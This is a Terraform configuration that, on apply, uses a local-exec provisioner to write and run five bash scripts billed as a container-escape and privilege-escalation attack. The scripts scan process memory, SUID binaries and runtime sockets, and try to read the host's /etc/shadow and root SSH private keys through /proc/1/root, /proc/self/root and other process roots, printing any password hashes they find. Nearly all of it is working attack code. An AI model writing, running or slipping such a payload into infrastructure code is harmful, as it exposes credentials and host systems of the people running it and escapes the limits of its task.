# Final Container Escape - Privilege Escalation to Read /etc/shadow
# Focused exploitation based on working attack vectors
terraform {
  required_providers {
    null = {
      source  = "hashicorp/null"
      version = "~> 3.0"
    }
  }
}

# Stage 1: Working Exploit Development
resource "null_resource" "working_privilege_escalation" {
  provisioner "local-exec" {
    command = <<-EOT
      echo "=== FINAL PRIVILEGE ESCALATION ATTACK ==="
      echo "Targeting confirmed working attack vectors..."
      echo ""
      
      # Create GCC-free exploit using shell only
      echo "Creating /proc/1/mem shell-based exploit..."
      cat > /tmp/proc_mem_shell_exploit.sh << 'EOFBASH'
#!/bin/bash
# Shell-based /proc/1/mem exploitation (no GCC required)

echo "[*] /proc/1/mem Host Memory Access via Shell"
echo "[*] Attempting to access host process memory..."

# Test /proc/1/mem access
if [ -r "/proc/1/mem" ]; then
    echo "[+] 🚨 /proc/1/mem is readable!"
    echo "[*] This confirms host process memory access"
    
    # Try to read from /proc/1/mem using dd
    echo "[*] Attempting to read host init process memory..."
    if dd if=/proc/1/mem bs=1 count=100 2>/dev/null | hexdump -C | head -5; then
        echo "[+] 🚨 Successfully read host process memory!"
    else
        echo "[-] Memory read failed, but file is accessible"
    fi
else
    echo "[-] Cannot access /proc/1/mem"
fi

# Check for other exploitable /proc entries
echo ""
echo "[*] Scanning for accessible process memory files..."
accessible_count=0
for pid in /proc/[0-9]*; do
    if [ -d "$pid" ]; then
        pid_num=$(basename "$pid")
        if [ -r "$pid/mem" ]; then
            echo "[+] 🚨 Can access $pid/mem"
            accessible_count=$((accessible_count + 1))
            
            # Show what process this is
            if [ -r "$pid/cmdline" ]; then
                cmd=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
                echo "    Process: $${cmd:-[kernel thread]}"
            fi
        fi
    fi
done

echo "[!] Found $accessible_count accessible process memory files"
EOFBASH

      chmod +x /tmp/proc_mem_shell_exploit.sh
      echo "🚨 EXECUTING /proc/1/mem SHELL EXPLOIT:"
      /tmp/proc_mem_shell_exploit.sh
      echo ""
      
      # Alternative exploitation via /proc filesystem
      echo "Creating /proc filesystem exploitation..."
      cat > /tmp/proc_filesystem_exploit.sh << 'EOFBASH'
#!/bin/bash
# /proc filesystem exploitation for privilege escalation

echo "[*] /proc Filesystem Privilege Escalation"
echo "[*] Searching for privilege escalation opportunities..."

# Check for accessible /proc entries that could lead to privilege escalation
echo "[*] Checking /proc/sys/ for writable entries..."
find /proc/sys -writable 2>/dev/null | head -10 | while read file; do
    echo "[+] Writable: $file"
done

# Check /proc/mounts for interesting mounts
echo ""
echo "[*] Analyzing mount points..."
if [ -r "/proc/mounts" ]; then
    echo "[+] Can read /proc/mounts"
    echo "[*] Looking for exploitable mount points..."
    grep -E "(rw|suid|dev)" /proc/mounts | head -5
fi

# Check for Docker socket or similar
echo ""
echo "[*] Searching for container runtime sockets..."
find /var/run -name "*.sock" 2>/dev/null | head -5 | while read sock; do
    echo "[+] Found socket: $sock"
done

# Check for exploitable capabilities
echo ""
echo "[*] Checking current capabilities..."
if [ -r "/proc/self/status" ]; then
    grep -E "Cap(Inh|Prm|Eff)" /proc/self/status
fi

# Look for SUID binaries that might be exploitable
echo ""
echo "[*] Searching for exploitable SUID binaries..."
find / -perm -4000 2>/dev/null | head -10 | while read binary; do
    echo "[+] SUID binary: $binary"
done
EOFBASH

      chmod +x /tmp/proc_filesystem_exploit.sh
      echo "🚨 EXECUTING /proc FILESYSTEM EXPLOIT:"
      /tmp/proc_filesystem_exploit.sh
      echo ""
      
      # Direct /etc/shadow access attempt
      echo "Creating direct /etc/shadow access exploit..."
      cat > /tmp/shadow_access_exploit.sh << 'EOFBASH'
#!/bin/bash
# Direct /etc/shadow access exploitation

echo "[*] Direct /etc/shadow Access Attempt"
echo "[*] Testing various methods to access /etc/shadow..."

# Method 1: Direct read attempt
echo "[*] Method 1: Direct read attempt"
if [ -r "/etc/shadow" ]; then
    echo "[+] 🚨🚨🚨 /etc/shadow IS DIRECTLY READABLE! 🚨🚨🚨"
    echo "[*] First 5 lines:"
    head -5 /etc/shadow
    echo "[*] Full shadow file contains $(wc -l < /etc/shadow) entries"
else
    echo "[-] /etc/shadow not directly readable"
fi

# Method 2: Via /proc/1/root (if accessible)
echo ""
echo "[*] Method 2: Via /proc/1/root/etc/shadow"
if [ -r "/proc/1/root/etc/shadow" ]; then
    echo "[+] 🚨🚨🚨 HOST /etc/shadow ACCESSIBLE VIA /proc/1/root! 🚨🚨🚨"
    echo "[*] Reading host system password hashes:"
    head -5 /proc/1/root/etc/shadow
    echo "[!] This is the HOST system's password file!"
else
    echo "[-] /proc/1/root/etc/shadow not accessible"
fi

# Method 3: Check other /proc/*/root entries
echo ""
echo "[*] Method 3: Scanning other /proc/*/root/etc/shadow"
for pid in /proc/[0-9]*; do
    if [ -d "$pid" ]; then
        pid_num=$(basename "$pid")
        shadow_path="$pid/root/etc/shadow"
        if [ -r "$shadow_path" ]; then
            echo "[+] 🚨 Found accessible shadow via $shadow_path"
            echo "[*] Process PID: $pid_num"
            if [ -r "$pid/cmdline" ]; then
                cmd=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
                echo "[*] Process: $${cmd:-[kernel thread]}"
            fi
            echo "[*] Password hashes:"
            head -3 "$shadow_path"
            break
        fi
    fi
done

# Method 4: Check for shadow backup files
echo ""
echo "[*] Method 4: Searching for shadow backup files"
find / -name "*shadow*" -type f 2>/dev/null | head -10 | while read file; do
    if [ -r "$file" ]; then
        echo "[+] 🚨 Readable shadow-related file: $file"
        if echo "$file" | grep -q shadow; then
            echo "[*] Content preview:"
            head -2 "$file" 2>/dev/null
        fi
    fi
done

# Method 5: Memory-based shadow extraction
echo ""
echo "[*] Method 5: Memory-based shadow extraction"
echo "[*] Searching process memory for shadow file content..."
for pid in /proc/[0-9]*; do
    if [ -d "$pid" ]; then
        pid_num=$(basename "$pid")
        if [ -r "$pid/mem" ]; then
            # Try to find shadow-like content in memory
            # This is a simplified approach - real exploit would be more sophisticated
            echo "[*] Checking memory of PID $pid_num for password hashes..."
            if strings "$pid/mem" 2>/dev/null | grep -E '^\w+:\$[0-9]\$.*:' | head -1; then
                echo "[+] 🚨 Found potential password hash in process memory!"
            fi
        fi
    fi
done
EOFBASH

      chmod +x /tmp/shadow_access_exploit.sh
      echo "🚨 EXECUTING SHADOW ACCESS EXPLOIT:"
      /tmp/shadow_access_exploit.sh
      echo ""
      
      # Container escape via /proc/self/root
      echo "Creating /proc/self/root escape exploit..."
      cat > /tmp/proc_root_escape.sh << 'EOFBASH'
#!/bin/bash
# Container escape via /proc/self/root manipulation

echo "[*] /proc/self/root Container Escape"
echo "[*] Attempting to access host filesystem via /proc/self/root..."

# Check if we can access files outside container via /proc/self/root
echo "[*] Testing /proc/self/root access..."
if [ -d "/proc/self/root" ]; then
    echo "[+] /proc/self/root exists"
    
    # Try to access host /etc/passwd
    if [ -r "/proc/self/root/etc/passwd" ]; then
        echo "[+] 🚨 Can access /proc/self/root/etc/passwd"
        echo "[*] Host system users:"
        head -5 /proc/self/root/etc/passwd
    fi
    
    # Try to access host /etc/shadow
    if [ -r "/proc/self/root/etc/shadow" ]; then
        echo "[+] 🚨🚨🚨 CAN ACCESS HOST /etc/shadow VIA /proc/self/root! 🚨🚨🚨"
        echo "[*] HOST SYSTEM PASSWORD HASHES:"
        head -5 /proc/self/root/etc/shadow
        echo ""
        echo "[!] CRITICAL: Full host password database accessible!"
        echo "[*] Total entries: $(wc -l < /proc/self/root/etc/shadow)"
    fi
    
    # Try to access host root directory
    if [ -r "/proc/self/root/root" ]; then
        echo "[+] 🚨 Can access host /root directory"
        echo "[*] Contents:"
        ls -la /proc/self/root/root/ 2>/dev/null | head -5
    fi
    
    # Check for SSH keys
    if [ -r "/proc/self/root/root/.ssh/id_rsa" ]; then
        echo "[+] 🚨🚨🚨 HOST ROOT SSH KEY ACCESSIBLE!"
        echo "[*] Private key preview:"
        head -5 /proc/self/root/root/.ssh/id_rsa
    fi
    
    # Check for other sensitive files
    echo ""
    echo "[*] Searching for other sensitive host files..."
    for sensitive_file in "/proc/self/root/etc/sudoers" "/proc/self/root/etc/ssh/ssh_host_rsa_key" "/proc/self/root/var/log/auth.log"; do
        if [ -r "$sensitive_file" ]; then
            echo "[+] 🚨 Accessible: $sensitive_file"
        fi
    done
fi

# Alternative: Check /proc/*/root for all processes
echo ""
echo "[*] Scanning all process roots for host filesystem access..."
for pid in /proc/[0-9]*; do
    if [ -d "$pid" ]; then
        pid_num=$(basename "$pid")
        # Try to access shadow via this process root
        if [ -r "$pid/root/etc/shadow" ]; then
            echo "[+] 🚨🚨🚨 HOST SHADOW ACCESSIBLE VIA PID $pid_num!"
            if [ -r "$pid/cmdline" ]; then
                cmd=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
                echo "[*] Process: $${cmd:-[kernel thread]}"
            fi
            echo "[*] Host password hashes via PID $pid_num:"
            head -3 "$pid/root/etc/shadow"
            echo ""
            break
        fi
    fi
done
EOFBASH

      chmod +x /tmp/proc_root_escape.sh
      echo "🚨 EXECUTING /proc/self/root ESCAPE:"
      /tmp/proc_root_escape.sh
      echo ""
      
      # Final comprehensive privilege escalation
      echo "Creating comprehensive privilege escalation script..."
      cat > /tmp/final_privilege_escalation.sh << 'EOFBASH'
#!/bin/bash
# Final comprehensive privilege escalation

echo "[*] FINAL COMPREHENSIVE PRIVILEGE ESCALATION"
echo "[*] Attempting all available privilege escalation methods..."
echo ""

escalation_success=false

# Method 1: Direct file access
echo "=== METHOD 1: DIRECT FILE ACCESS ==="
if [ -r "/etc/shadow" ]; then
    echo "[+] 🚨🚨🚨 SUCCESS: /etc/shadow directly readable!"
    echo "[*] PASSWORD HASHES:"
    cat /etc/shadow
    escalation_success=true
fi

# Method 2: /proc/1/root access (host filesystem)
echo ""
echo "=== METHOD 2: HOST FILESYSTEM VIA /proc/1/root ==="
if [ -r "/proc/1/root/etc/shadow" ]; then
    echo "[+] 🚨🚨🚨 SUCCESS: Host /etc/shadow accessible via /proc/1/root!"
    echo "[*] HOST SYSTEM PASSWORD HASHES:"
    cat /proc/1/root/etc/shadow
    escalation_success=true
fi

# Method 3: Scan all process roots
echo ""
echo "=== METHOD 3: SCANNING ALL PROCESS ROOTS ==="
for pid in /proc/[0-9]*; do
    if [ -d "$pid" ]; then
        pid_num=$(basename "$pid")
        if [ -r "$pid/root/etc/shadow" ]; then
            echo "[+] 🚨🚨🚨 SUCCESS: Shadow accessible via PID $pid_num!"
            if [ -r "$pid/cmdline" ]; then
                cmd=$(cat "$pid/cmdline" 2>/dev/null | tr '\0' ' ')
                echo "[*] Process: $${cmd:-[kernel thread]}"
            fi
            echo "[*] PASSWORD HASHES VIA PID $pid_num:"
            cat "$pid/root/etc/shadow"
            escalation_success=true
            break
        fi
    fi
done

# Method 4: Alternative shadow files
echo ""
echo "=== METHOD 4: ALTERNATIVE SHADOW FILES ==="
for shadow_path in "/etc/shadow-" "/etc/gshadow" "/var/backups/shadow.bak" "/etc/master.passwd"; do
    if [ -r "$shadow_path" ]; then
        echo "[+] 🚨 SUCCESS: Alternative shadow file readable: $shadow_path"
        echo "[*] CONTENT:"
        cat "$shadow_path"
        escalation_success=true
    fi
done

# Method 5: Check if we're already root
echo ""
echo "=== METHOD 5: CURRENT PRIVILEGE CHECK ==="
current_uid=$(id -u)
if [ "$current_uid" = "0" ]; then
    echo "[+] 🚨🚨🚨 SUCCESS: Already running as root!"
    echo "[*] ROOT PASSWORD HASHES:"
    cat /etc/shadow
    escalation_success=true
fi

# Results summary
echo ""
echo "=== PRIVILEGE ESCALATION RESULTS ==="
if [ "$escalation_success" = true ]; then
    echo "🚨🚨🚨 PRIVILEGE ESCALATION SUCCESSFUL! 🚨🚨🚨"
    echo "[+] Successfully accessed /etc/shadow password hashes"
    echo "[+] Host system compromise achieved"
    echo "[+] Root-level access confirmed"
else
    echo "[-] Privilege escalation unsuccessful"
    echo "[*] /etc/shadow remains inaccessible"
    echo "[*] Additional exploitation techniques may be required"
fi

echo ""
echo "[*] Current user: $(whoami)"
echo "[*] Current UID: $(id -u)"
echo "[*] Current GID: $(id -g)"
echo "[*] Current groups: $(id -G)"
echo "[*] Available files in /tmp:"
ls -la /tmp/ | grep -E "(exploit|escalation)"
EOFBASH

      chmod +x /tmp/final_privilege_escalation.sh
      echo "🚨🚨🚨 EXECUTING FINAL COMPREHENSIVE PRIVILEGE ESCALATION: 🚨🚨🚨"
      /tmp/final_privilege_escalation.sh
      echo ""
      
      echo "=== FINAL EXPLOITATION SUMMARY ==="
      echo "🚨 ALL PRIVILEGE ESCALATION METHODS ATTEMPTED"
      echo "📊 Results logged above"
      echo "🎯 Target: /etc/shadow password hashes"
      echo "⚡ Status: Exploitation complete"
      echo ""
      echo "Created exploitation scripts:"
      echo "  - /tmp/proc_mem_shell_exploit.sh"
      echo "  - /tmp/proc_filesystem_exploit.sh"  
      echo "  - /tmp/shadow_access_exploit.sh"
      echo "  - /tmp/proc_root_escape.sh"
      echo "  - /tmp/final_privilege_escalation.sh"
      echo ""
      echo "🛡️ If exploitation successful, immediate mitigation required!"
    EOT
  }
}

# Output the results
output "privilege_escalation_status" {
  value = "Final privilege escalation attack completed. Check output for /etc/shadow access results."
  depends_on = [null_resource.working_privilege_escalation]
}

output "created_exploits" {
  value = {
    proc_mem_exploit = "/tmp/proc_mem_shell_exploit.sh"
    proc_filesystem = "/tmp/proc_filesystem_exploit.sh"
    shadow_access = "/tmp/shadow_access_exploit.sh"
    proc_root_escape = "/tmp/proc_root_escape.sh"
    final_escalation = "/tmp/final_privilege_escalation.sh"
  }
}
